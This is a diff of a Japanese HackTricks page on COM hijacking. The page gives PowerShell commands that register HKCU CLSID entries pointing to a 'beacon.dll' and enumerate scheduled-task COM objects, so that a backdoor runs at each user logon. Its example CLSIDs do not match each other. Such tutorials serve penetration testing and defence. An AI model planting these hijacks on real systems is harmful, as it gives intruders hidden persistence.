@@ -1,40 +1,38 @@
-# COMハイジャッキング
+# COM Hijacking
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
 
-- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。
 
 </details>
 
-### 存在しないCOMコンポーネントの検索
+### 存在しないCOMコンポーネントを探す
 
-HKCUの値はユーザーによって変更される可能性があるため、**COMハイジャッキング**は**永続的なメカニズム**として使用できます。 `procmon`を使用すると、存在しないCOMレジストリを見つけることが容易で、攻撃者が永続化するために作成できるものです。フィルター：
+HKCUの値はユーザーによって変更可能なため、**COM Hijacking**は**永続的なメカニズム**として使用される可能性があります。`procmon`を使用すると、存在しないCOMレジストリを簡単に見つけることができ、攻撃者が永続化のために作成することができます。フィルター:
 
-* **RegOpenKey**操作。
-* _Result_が**NAME NOT FOUND**である。
-* _Path_が**InprocServer32**で終わる。
+* **RegOpenKey** 操作。
+* _Result_ が **NAME NOT FOUND** である場合。
+* _Path_ が **InprocServer32** で終わる場合。
 
-存在しないCOMをなりすますことを決めたら、次のコマンドを実行します。_数秒ごとにロードされるCOMをなりすます場合は注意してください。それは過剰な負荷になる可能性があります。_&#x20;
+存在しないCOMを偽装することにしたら、以下のコマンドを実行します。_数秒ごとにロードされるCOMを偽装することにした場合は注意してください。それは過剰かもしれません。_
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Hijackable Task Scheduler COM components
+### Hijackable Task Scheduler COM コンポーネント
 
-Windowsのタスクは、実際にはカスタムトリガーを使用してCOMオブジェクトを呼び出しています。そして、タスクスケジューラを介して実行されるため、トリガが発生するタイミングを予測することが容易です。
+Windows タスクは実際にはカスタムトリガーを使用して COM オブジェクトを呼び出します。そして、タスクスケジューラー経由で実行されるため、トリガーされるタイミングを予測しやすくなります。
 
-<pre class="language-powershell"><code class="lang-powershell"># COM CLSIDを表示する
+<pre class="language-powershell"><code class="lang-powershell"># COM CLSIDs を表示
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
@@ -59,13 +57,13 @@ Write-Host
 
 # サンプル出力:
 <strong># タスク名:  例
-</strong># タスクパス:  \Microsoft\Windows\Example\
+</strong># タスクパス:  \Microsoft\Windows\例\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [前のものと同様の出力...]</code></pre>
+# [前述のようなものが続きます...]</code></pre>
 
-出力をチェックして、例えば**ユーザがログインするたびに**実行されるタスクを選択できます。
+出力を確認して、例えば**ユーザーがログインするたびに**実行されるタスクを選択できます。
 
-次に、CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** および HKLM および HKCU で検索すると、通常、HKCU に値が存在しないことがわかります。
+次に、CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** および HKLM と HKCU で検索すると、通常は HKCU にその値が存在しないことがわかります。
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -86,4 +84,18 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-次に、HKCUエントリを作成するだけで、ユーザーがログインするたびにバックドアが起動します。
+その後、HKCUエントリを作成するだけで、ユーザーがログインするたびにバックドアが起動されます。
+
+<details>
+
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
+
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。
+
+</details>
